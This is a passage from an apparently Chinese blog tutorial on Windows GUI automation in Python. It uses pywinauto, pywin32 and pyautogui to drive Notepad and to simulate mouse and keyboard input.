class="line"></span><br><span class="line"># 控件常用操作</span><br><span class="line">ctrl.draw_outline(colour=&#x27;green&#x27;) # 空间外围画框，便于查看，支持&#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;</span><br><span class="line">ctrl.print_control_identifiers(depth=None, filename=None) # 以树形结构打印其包含的元素，详见打印元素</span><br><span class="line">        # depth:打印的深度，缺省时打印最大深度。</span><br><span class="line">        # filename:将返回的标识存成文件（生成的文件与当前运行的脚本在同一个路径下）</span><br><span class="line">ctrl.scroll(direction, amount, count=1,) # 滚动</span><br><span class="line">        # direction ：&quot;up&quot;, &quot;down&quot;, &quot;left&quot;, &quot;right&quot;</span><br><span class="line">        # amount：&quot;line&quot; or &quot;page&quot;</span><br><span class="line">        # count：int 滚动次数</span><br><span class="line">ctrl.capture_as_image() # 返回控件的 PIL image对象，可继续使用其方法如下：</span><br><span class="line">        # eg: ctrl.capture_as_image().save(img_path)</span><br><span class="line">ret = ctrl.rectangle() # 控件上下左右坐标，(L430, T177, R1490, B941)，可输出上下左右</span><br><span class="line">        # eg: ret.top=177</span><br><span class="line">            # ret.bottom=941</span><br><span class="line">            # ret.left=430</span><br><span class="line">            # ret.right=1490</span><br></pre></td></tr></table></figure>

<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><ul>
<li>用UISpy定位，记事本</li>
</ul>
<blockquote>
<p>不用微信演示，经过测试微信应该做了类似的屏蔽，很多内容获取不到，比如用打印当前窗口的所有controller（控件和属性）<code>win_main_Dialog.print_control_identifiers(depth=None, filename=None)</code>，报错了</p>
</blockquote>
<p><img src="/aposts/5639d3cc/image-20220930153132566.png" alt="image-20220930153132566"></p>
<ul>
<li>测试代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pywinauto.application import Application</span><br><span class="line"># 启动记事本</span><br><span class="line">app = Application(backend = &quot;uia&quot;).start(r&#x27;notepad.exe&#x27;)</span><br><span class="line"># 找到记事本主窗口</span><br><span class="line">win = app.window(title_re=&quot;.*记事本*.&quot;)</span><br><span class="line">win.child_window(class_name=&quot;Edit&quot;).type_keys(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>还有一种方法是可以打印主窗口控件列表，然后你可以通过控件操作这个对象</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pywinauto.application import Application</span><br><span class="line"># 启动记事本</span><br><span class="line">app = Application(backend = &quot;uia&quot;).start(r&#x27;notepad.exe&#x27;)</span><br><span class="line"># 找到记事本主窗口</span><br><span class="line">win = app.window(title_re=&quot;.*记事本*.&quot;)</span><br><span class="line">print(&#x27;-----------------&#x27;)</span><br><span class="line"># 打印主窗口控件列表，然后你可以通过控件id操作这个对象</span><br><span class="line">win.print_control_identifiers()</span><br></pre></td></tr></table></figure>

<ul>
<li>打印的值的格式大概如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Control Identifiers:</span><br><span class="line"></span><br><span class="line">Dialog - &#x27;无标题 - 记事本&#x27;    (L267, T123, R1707, B794)</span><br><span class="line">[&#x27;无标题 - 记事本Dialog&#x27;, &#x27;Dialog&#x27;, &#x27;无标题 - 记事本&#x27;]</span><br><span class="line">child_window(title=&quot;无标题 - 记事本&quot;, control_type=&quot;Window&quot;)</span><br><span class="line">   | </span><br><span class="line">   | Edit - &#x27;文本编辑器&#x27;    (L278, T198, R1696, B749)</span><br><span class="line">   | [&#x27;&#x27;, &#x27;Edit&#x27;, &#x27;0&#x27;, &#x27;1&#x27;]</span><br><span class="line">   | child_window(title=&quot;文本编辑器&quot;, auto_id=&quot;15&quot;, control_type=&quot;Edit&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   | ...</span><br><span class="line">   | </span><br><span class="line">   | Menu - &#x27;应用程序&#x27;    (L278, T168, R1696, B197)</span><br><span class="line">   | [&#x27;应用程序Menu&#x27;, &#x27;应用程序&#x27;, &#x27;Menu2&#x27;]</span><br><span class="line">   | child_window(title=&quot;应用程序&quot;, auto_id=&quot;MenuBar&quot;, control_type=&quot;MenuBar&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | MenuItem - &#x27;文件(F)&#x27;    (L278, T168, R350, B197)</span><br><span class="line">   |    | [&#x27;文件(F)&#x27;, &#x27;MenuItem2&#x27;, &#x27;文件(F)MenuItem&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;文件(F)&quot;, control_type=&quot;MenuItem&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | MenuItem - &#x27;编辑(E)&#x27;    (L350, T168, R422, B197)</span><br><span class="line">   |    | [&#x27;编辑(E)MenuItem&#x27;, &#x27;MenuItem3&#x27;, &#x27;编辑(E)&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;编辑(E)&quot;, control_type=&quot;MenuItem&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | MenuItem - &#x27;格式(O)&#x27;    (L422, T168, R499, B197)</span><br><span class="line">   |    | [&#x27;MenuItem4&#x27;, &#x27;格式(O)MenuItem&#x27;, &#x27;格式(O)&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;格式(O)&quot;, control_type=&quot;MenuItem&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | MenuItem - &#x27;查看(V)&#x27;    (L499, T168, R573, B197)</span><br><span class="line">   |    | [&#x27;MenuItem5&#x27;, &#x27;查看(V)MenuItem&#x27;, &#x27;查看(V)&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;查看(V)&quot;, control_type=&quot;MenuItem&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | MenuItem - &#x27;帮助(H)&#x27;    (L573, T168, R649, B197)</span><br><span class="line">   |    | [&#x27;帮助(H)&#x27;, &#x27;帮助(H)MenuItem&#x27;, &#x27;MenuItem6&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;帮助(H)&quot;, control_type=&quot;MenuItem&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>调整后的代码为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pywinauto.application import Application</span><br><span class="line"># 启动记事本</span><br><span class="line">app = Application(backend = &quot;uia&quot;).start(r&#x27;notepad.exe&#x27;)</span><br><span class="line"># 找到记事本主窗口</span><br><span class="line">win = app.window(title_re=&quot;.*记事本*.&quot;)</span><br><span class="line">print(&#x27;-----------------&#x27;)</span><br><span class="line"># 打印主窗口控件列表</span><br><span class="line">win.print_control_identifiers()</span><br><span class="line"># win.child_window(class_name=&quot;Edit&quot;).type_keys(&quot;hello&quot;)</span><br><span class="line"># 操作对应窗口下面的组件</span><br><span class="line">win.Edit.type_keys(&#x27;hello&#x27;)</span><br><span class="line">win[&#x27;Edit&#x27;].type_keys(&#x27;world&#x27;)</span><br></pre></td></tr></table></figure>



<p><img src="/aposts/5639d3cc/image-20220930154435316.png" alt="image-20220930154435316"></p>
<ul>
<li>如果打印全部控件内容太多，也可以打印部分</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pywinauto.application import Application</span><br><span class="line"># 启动记事本</span><br><span class="line">app = Application(backend = &quot;uia&quot;).start(r&#x27;notepad.exe&#x27;)</span><br><span class="line"># 找到记事本主窗口</span><br><span class="line">win = app.window(title_re=&quot;.*记事本*.&quot;)</span><br><span class="line">print(&#x27;-----------------&#x27;)</span><br><span class="line">dlg = win[&#x27;Edit&#x27;]</span><br><span class="line">dlg.print_control_identifiers()</span><br></pre></td></tr></table></figure>

<ul>
<li>对应打印的内容</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dit - &#x27;文本编辑器&#x27;    (L781, T200, R2199, B751)</span><br><span class="line">[&#x27;&#x27;, &#x27;Edit&#x27;]</span><br><span class="line">child_window(title=&quot;文本编辑器&quot;, auto_id=&quot;15&quot;, control_type=&quot;Edit&quot;)</span><br><span class="line">   | </span><br><span class="line">   | ScrollBar - &#x27;垂直滚动条&#x27;    (L2173, T200, R2199, B751)</span><br><span class="line">   | [&#x27;垂直滚动条&#x27;, &#x27;垂直滚动条ScrollBar&#x27;, &#x27;ScrollBar&#x27;]</span><br><span class="line">   | child_window(title=&quot;垂直滚动条&quot;, auto_id=&quot;NonClientVerticalScrollBar&quot;, control_type=&quot;ScrollBar&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | Button - &#x27;上一行&#x27;    (L2173, T200, R2199, B226)</span><br><span class="line">   |    | [&#x27;上一行Button&#x27;, &#x27;Button&#x27;, &#x27;上一行&#x27;, &#x27;Button0&#x27;, &#x27;Button1&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;上一行&quot;, auto_id=&quot;UpButton&quot;, control_type=&quot;Button&quot;)</span><br><span class="line">   |    | </span><br><span class="line">   |    | Button - &#x27;下一行&#x27;    (L2173, T725, R2199, B751)</span><br><span class="line">   |    | [&#x27;下一行&#x27;, &#x27;下一行Button&#x27;, &#x27;Button2&#x27;]</span><br><span class="line">   |    | child_window(title=&quot;下一行&quot;, auto_id=&quot;DownButton&quot;, control_type=&quot;Button&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>两者结合使用</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pywinauto.application <span class="keyword">import</span> Application</span><br><span class="line"><span class="comment"># 启动记事本</span></span><br><span class="line">app = Application(backend = <span class="string">&quot;uia&quot;</span>).start(<span class="string">r&#x27;notepad.exe&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到记事本主窗口</span></span><br><span class="line">win = app.window(title_re=<span class="string">&quot;.*记事本*.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-----------------&#x27;</span>)</span><br><span class="line"><span class="comment"># 打印主窗口控件列表</span></span><br><span class="line"><span class="comment"># win.print_control_identifiers()</span></span><br><span class="line"><span class="comment"># 记事本中输入内容</span></span><br><span class="line">win.child_window(class_name=<span class="string">&quot;Edit&quot;</span>).type_keys(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># 选择菜单另存为</span></span><br><span class="line">win.menu_select(<span class="string">&quot;文件-&gt;另存为&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 定位另存为窗口的输入框，并且输入内容；注意这里有三层，一层层往下面找</span></span><br><span class="line">win.child_window(class_name=<span class="string">&#x27;DUIViewWndClassName&#x27;</span>, control_type=<span class="string">&#x27;Pane&#x27;</span>).\</span><br><span class="line">    child_window(class_name=<span class="string">&#x27;AppControlHost&#x27;</span>,control_type=<span class="string">&#x27;ComboBox&#x27;</span>, auto_id=<span class="string">&#x27;FileNameControlHost&#x27;</span>).\</span><br><span class="line">    child_window(class_name=<span class="string">&#x27;Edit&#x27;</span>).type_keys(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment"># 点击保存</span></span><br><span class="line">win[<span class="string">u&quot;保存&quot;</span>].click_input()</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/5639d3cc/image-20220930165315916.png" alt="image-20220930165315916"></p>
<ul>
<li>优化下代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">from pywinauto.application import Application</span><br><span class="line"></span><br><span class="line">def driver():</span><br><span class="line">    app = Application(backend=&quot;uia&quot;).start(r&quot;notepad.exe&quot;)</span><br><span class="line">    return app</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    # 启动记事本</span><br><span class="line">    app = driver()</span><br><span class="line">    # 找到记事本主窗口</span><br><span class="line">    win = app.window(title_re=&quot;.*记事本*.&quot;)</span><br><span class="line">    print(&#x27;-----------------&#x27;)</span><br><span class="line">    # 打印主窗口控件列表</span><br><span class="line">    # win.print_control_identifiers()</span><br><span class="line">    # 记事本中输入内容</span><br><span class="line">    win.Edit.type_keys(&quot;hello&quot;)</span><br><span class="line">    # 选择菜单另存为</span><br><span class="line">    win.menu_select(&quot;文件-&gt;另存为&quot;)</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    # 定位另存为窗口的输入框，并且输入内容；注意这里有三层，一层层往下面找</span><br><span class="line">    win.child_window(class_name=&#x27;DUIViewWndClassName&#x27;, control_type=&#x27;Pane&#x27;).\</span><br><span class="line">        child_window(class_name=&#x27;AppControlHost&#x27;,control_type=&#x27;ComboBox&#x27;, auto_id=&#x27;FileNameControlHost&#x27;).\</span><br><span class="line">        child_window(class_name=&#x27;Edit&#x27;).type_keys(&#x27;hello&#x27;)</span><br><span class="line">    # 点击保存</span><br><span class="line">    win[u&quot;保存&quot;].click_input()</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    # 关闭窗口</span><br><span class="line">    win.close()</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure>



<ul>
<li>更多api参考这个<a href="https://www.kancloud.cn/gnefnuy/pywinauto_doc/1193035">文档</a></li>
</ul>
<h2 id="pywin32"><a href="#pywin32" class="headerlink" title="pywin32"></a>pywin32</h2><ul>
<li>pywin32 包含 win32gui、win32api、win32con 3个子模块，主要用于窗口管理（定位窗口、显示和关闭窗口、窗口前置、窗口聚焦、获取窗口位置等），通常用的较多的是 win32gui，因此本文仅对此子模块进行介绍</li>
<li>安装</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pywin32</span><br></pre></td></tr></table></figure>

<ul>
<li>常用的事件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查找窗口句柄</span><br><span class="line">win32gui.FindWindow()</span><br><span class="line">#查找指定窗口的菜单</span><br><span class="line">win32gui.GetMenu()</span><br><span class="line">#查找某个菜单的子菜单</span><br><span class="line">win32gui.GetSubMenu()</span><br><span class="line">#获得子菜单的ID</span><br><span class="line">win32gui.GetMenuItemID()</span><br><span class="line">#获得某个子菜单的内容</span><br><span class="line">win32gui.GetMenuItemInfo()</span><br><span class="line">#给句柄发送通知（点击事件）</span><br><span class="line">win32gui.PostMessage()　</span><br></pre></td></tr></table></figure>

<ul>
<li>实例代码打开记事本，点击文件另存为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import win32gui, win32con, win32api</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 打开记事本</span><br><span class="line">win32api.ShellExecute(0,&quot;open&quot;,&quot;notepad.exe&quot;,&quot;&quot;,&quot;&quot;,1)</span><br><span class="line"></span><br><span class="line"># 等待记事本窗口打开</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line"># 寻找记事本窗口</span><br><span class="line">notepad = win32gui.FindWindow(&quot;Notepad&quot;, None)</span><br><span class="line"></span><br><span class="line"># 若为非 0 的值，代表有找到窗口</span><br><span class="line">if (notepad != 0):</span><br><span class="line"></span><br><span class="line">    # 设置记事本标题</span><br><span class="line">    win32gui.SendMessage(notepad, win32con.WM_SETTEXT, None, &quot;Hello&quot;)</span><br><span class="line"></span><br><span class="line">    # 寻找输入文字的地方</span><br><span class="line">    edit = win32gui.FindWindowEx(notepad, None, &quot;Edit&quot;, None)</span><br><span class="line"></span><br><span class="line">    # 输入文字</span><br><span class="line">    win32gui.SendMessage(edit, win32con.WM_SETTEXT, None, &quot;您好！Pythonn&quot;)</span><br><span class="line">    # 插入一个回车</span><br><span class="line">    win32gui.PostMessage(edit, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)</span><br><span class="line"></span><br><span class="line">    menu_handle = win32gui.GetMenu(notepad)</span><br><span class="line">    # 这里的代码分块逻辑，搞不明白</span><br><span class="line">    for index in [0,3]:</span><br><span class="line">        cmd_ID = win32gui.GetMenuItemID(menu_handle, 3)</span><br><span class="line">        menu_handle = win32gui.GetSubMenu(menu_handle, 0)</span><br><span class="line"></span><br><span class="line">    # 点击另存为</span><br><span class="line">    win32gui.PostMessage(notepad, win32con.WM_COMMAND, cmd_ID, 0)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>代码来做<a href="https://blog.csdn.net/qq_33833073/article/details/104011895">这里</a></li>
<li><a href="https://www.cnblogs.com/LyShark/p/12538209.html">更多参考</a></li>
</ul>
<p><strong>放弃对这个模块的研究，写用例非常累</strong></p>
<h2 id="pyautogui"><a href="#pyautogui" class="headerlink" title="pyautogui"></a>pyautogui</h2><ul>
<li>pyautogui 模块主要用于屏幕控制（获取屏幕尺寸、截屏等）、鼠标控制（移动鼠标、单击、双击、右击、拖拽、滚动等）、键盘控制（编辑、按键等）</li>
<li>主要是<strong>图片识别</strong></li>
</ul>
<p><strong>几个特有功能</strong></p>
<ul>
<li><strong>移动鼠标</strong>并在其他应用程序的窗口中<strong>单击</strong>。</li>
<li>向应用程序发送击键（例如，填写表单）。</li>
<li>截取屏幕<strong>截图</strong>，并给出一个图像（例如，按钮或复选框的图像），然后在屏幕上找到它。</li>
<li>找到应用程序的窗口，然后移动、调整大小、最大化、最小化或关闭它（目前仅限 Windows）。</li>
<li>显示警报和消息框。</li>
</ul>
<h3 id="前置参数"><a href="#前置参数" class="headerlink" title="前置参数"></a>前置参数</h3><ul>
<li><strong>来自于<a href="https://www.jianshu.com/p/b4345e676c34">这里</a></strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui </span><br><span class="line"><span class="comment"># 停顿功能 </span></span><br><span class="line">pyautogui.PAUSE = <span class="number">1</span> <span class="comment"># 调用在执行动作后暂停的秒数，只能在执行一些pyautogui动作后才能使用，建议用time.sleep</span></span><br><span class="line"><span class="comment"># 自动 防故障功能</span></span><br><span class="line">pyautogui.FAILSAFE = <span class="literal">True</span> <span class="comment"># 启用自动防故障功能，左上角的坐标为（0，0），将鼠标移到屏幕的左上角，来抛出failSafeException异常</span></span><br></pre></td></tr></table></figure>

<h3 id="鼠标操作"><a href="#鼠标操作" class="headerlink" title="鼠标操作"></a>鼠标操作</h3><h4 id="获取屏幕的宽度和高度"><a href="#获取屏幕的宽度和高度" class="headerlink" title="获取屏幕的宽度和高度"></a>获取屏幕的宽度和高度</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">width, height = pyautogui.size() <span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line"><span class="built_in">print</span>(width, height)</span><br></pre></td></tr></table></figure>

<h4 id="获取鼠标当前位置"><a href="#获取鼠标当前位置" class="headerlink" title="获取鼠标当前位置"></a>获取鼠标当前位置</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">currentMouseX, currentMouseY = pyautogui.position() <span class="comment"># 鼠标当前位置</span></span><br><span class="line"><span class="built_in">print</span>(currentMouseX, currentMouseY)</span><br></pre></td></tr></table></figure>

<h4 id="鼠标移动类操作"><a href="#鼠标移动类操作" class="headerlink" title="鼠标移动类操作"></a>鼠标移动类操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pyautogui.moveTo(x,y,持续时间) 在持续时间内 将光标移动到目标位置(x,y)</span></span><br><span class="line">pyautogui.moveTo(<span class="number">100</span>, <span class="number">100</span>, duration=<span class="number">0.25</span>) <span class="comment"># 移动到 (100,100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pyautogui.moveRel(xOffset,yxOffset,持续时间) 在持续时间内 将光标偏移 距离原始位置 xOffset,yxOffset 的位置</span></span><br><span class="line">pyautogui.moveRel(<span class="number">50</span>, <span class="number">0</span>, duration=<span class="number">0.25</span>) <span class="comment"># 从当前位置右移50像素</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现拖拽效果</span></span><br><span class="line">pyautogui.mouseDown(<span class="number">740</span>,<span class="number">73</span>)  <span class="comment">#鼠标按下指定位置</span></span><br><span class="line">pyautogui.moveRel(<span class="number">100</span>,<span class="number">0</span>,<span class="number">2</span>)  <span class="comment">#移动/可以使用其他移动方法</span></span><br><span class="line">pyautogui.mouseUp()     <span class="comment"># 鼠标抬起</span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">pyautogui.dragTo(<span class="number">100</span>,<span class="number">300</span>,duration=<span class="number">1</span>)   </span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">pyautogui.dragRel(<span class="number">100</span>,<span class="number">300</span>,duration=<span class="number">4</span>) </span><br></pre></td></tr></table></figure>

<h4 id="鼠标滚动类操作"><a href="#鼠标滚动类操作" class="headerlink" title="鼠标滚动类操作"></a>鼠标滚动类操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># scroll函数控制鼠标滚轮的滚动，amount_to_scroll参数表示滚动的格数。正数则页面向上滚动，负数则向下滚动</span></span><br><span class="line"><span class="comment"># pyautogui.scroll(clicks=amount_to_scroll, x=moveToX, y=moveToY)</span></span><br><span class="line"><span class="comment"># 默认从当前光标位置进行滑动  amount_to_scroll是个数字 数字太小效果可能不明显, 正数表示往上划 负数表示往下化</span></span><br><span class="line">pyautogui.scroll(<span class="number">500</span>, <span class="number">20</span>, <span class="number">2</span>)</span><br><span class="line">pyautogui.scroll(<span class="number">100</span>) <span class="comment"># 向上滚动100格</span></span><br><span class="line">pyautogui.scroll(-<span class="number">100</span>) <span class="comment"># 向下滚动100格</span></span><br><span class="line">pyautogui.scroll(<span class="number">100</span>, x=<span class="number">100</span>, y=<span class="number">100</span>) <span class="comment"># 移动到(100, 100)位置再向上滚动100格</span></span><br></pre></td></tr></table></figure>

<h4 id="鼠标点击类操作"><a href="#鼠标点击类操作" class="headerlink" title="鼠标点击类操作"></a>鼠标点击类操作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pyautogui.click(x,y,clicks=点击次数,interval=每次点击间隔频率,button=可以是left表示左击 可以是right表示右击 可以是middle表示中击)</span></span><br><span class="line">pyautogui.click(<span class="number">10</span>, <span class="number">20</span>, <span class="number">2</span>, <span class="number">0.25</span>, button=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">pyautogui.click(x=<span class="number">100</span>, y=<span class="number">200</span>, duration=<span class="number">2</span>) <span class="comment"># 先移动到(100, 200)再单击</span></span><br><span class="line">pyautogui.click() <span class="comment"># 鼠标当前位置点击一下</span></span><br><span class="line">pyautogui.doubleClick() <span class="comment"># 鼠标当前位置左击两下</span></span><br><span class="line">pyautogui.doubleClick(x=<span class="number">100</span>, y=<span class="number">150</span>, button=<span class="string">&quot;left&quot;</span>) <span class="comment"># 鼠标在（100，150）位置左击两下</span></span><br><span class="line">pyautogui.tripleClick() <span class="comment"># 鼠标当前位置左击三下</span></span><br><span class="line">pyautogui.rightClick(<span class="number">10</span>,<span class="number">10</span>)   <span class="comment"># 指定位置，双击右键</span></span><br><span class="line">pyautogui.middleClick(<span class="number">10</span>,<span class="number">10</span>)  <span class="comment"># 指定位置，双击中键</span></span><br></pre></td></tr></table></figure>

<h3 id="键盘操作"><a href="#键盘操作" class="headerlink" title="键盘操作"></a>键盘操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 相关操作</span></span><br><span class="line"><span class="comment"># pyautogui.typewrite(要输入的字符只能是英文,interval=输入每个字符的间隔频率)</span></span><br><span class="line">pyautogui.typewrite(<span class="string">&#x27;python&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># typewrite 还可以传入单字母的列表</span></span><br><span class="line"><span class="comment"># 运行下面代码，编辑器里面就会输出 python 之后换行。</span></span><br><span class="line">pyautogui.typewrite([<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;enter&#x27;</span>])   </span><br><span class="line"></span><br><span class="line"><span class="comment"># pyautogui.keyDown()：模拟按键按下</span></span><br><span class="line"><span class="comment"># pyautogui.keyUP()：模拟按键松开</span></span><br><span class="line"><span class="comment"># pyautogui.press(键盘按键字母)  模拟一次按键过程，即 keyDown 和 keyUP 的组合 按下指定的键盘按键</span></span><br><span class="line"><span class="comment"># pyautogui.hotkey(&quot;ctrl&quot;,&quot;a&quot;)  实现组合键功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按住 shift 按键，然后再按住 1 按键，就可以了。用 pyautogui 控制就是</span></span><br><span class="line">pyautogui.keyDown(<span class="string">&#x27;shift&#x27;</span>)    </span><br><span class="line">pyautogui.press(<span class="string">&#x27;1&#x27;</span>)    </span><br><span class="line">pyautogui.keyUp(<span class="string">&#x27;shift&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入中文字符的方法  借用 pyperclip模块</span></span><br><span class="line"><span class="keyword">import</span> pyperclip</span><br><span class="line">pyperclip.copy(<span class="string">&quot;要书写的字符串&quot;</span>)  <span class="comment">#复制字符串</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">pyautogui.hotkey(<span class="string">&quot;ctrl&quot;</span>,<span class="string">&quot;v&quot;</span>) <span class="comment">#实现复制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pyautogui.KEYBOARD_KEYS数组中就是press()，keyDown()，keyUp()和hotkey()函数可以输入的按键名称</span></span><br><span class="line">pyautogui.KEYBOARD_KEYS = [<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;accept&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;alt&#x27;</span>, <span class="string">&#x27;altleft&#x27;</span>, <span class="string">&#x27;altright&#x27;</span>, <span class="string">&#x27;apps&#x27;</span>, <span class="string">&#x27;backspace&#x27;</span>, <span class="string">&#x27;browserback&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;browserfavorites&#x27;</span>, <span class="string">&#x27;browserforward&#x27;</span>, <span class="string">&#x27;browserhome&#x27;</span>, <span class="string">&#x27;browserrefresh&#x27;</span>, <span class="string">&#x27;browsersearch&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;browserstop&#x27;</span>, <span class="string">&#x27;capslock&#x27;</span>, <span class="string">&#x27;clear&#x27;</span>, <span class="string">&#x27;convert&#x27;</span>, <span class="string">&#x27;ctrl&#x27;</span>, <span class="string">&#x27;ctrlleft&#x27;</span>, <span class="string">&#x27;ctrlright&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;divide&#x27;</span>, <span 